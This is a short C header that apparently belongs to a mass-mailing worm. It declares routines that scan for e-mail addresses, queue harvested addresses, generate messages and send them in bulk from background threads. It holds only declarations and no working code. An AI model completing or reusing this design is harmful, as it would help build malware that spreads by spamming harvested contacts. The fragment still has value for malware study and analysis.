#ifndef NO_EMAIL

void mk_smtpdate(FILETIME *in_ft, char *buf);
char *strrchr(const char *str, char ch);
char *strchr(const char *str, char ch);
int memcmpi(unsigned char *, unsigned char *, int);
int html_replace(char *);
int html_replace2(char *);
int cat_wsprintf(LPTSTR lpOutput, LPCTSTR lpFormat, ...);

/* Queue of found e-mail addresses */
#pragma pack(push, 1)
struct mailq_t {
	struct mailq_t *next;
	unsigned long tick_got;
	char state;		/* 0=not processed yet, 1=processing, 2=processed */
	char priority;	/* 0=normal (from scanner), 1=lower (from generator) */
	char to[1];		/* variable-length */
};
#pragma pack(pop)

extern struct mailq_t * volatile massmail_queue;

int massmail_addq(const char *email, int prior);

void MassMailInit(void);
void MassMail(void);
DWORD WINAPI MassMailThread(LPVOID);

char *msg_generate(char *email);

void Search(void);
void SearchInit(void);
void SearchMain(void);
void SearchFreeze(int do_freeze);

DWORD WINAPI SearchEmail(LPVOID param);

#endif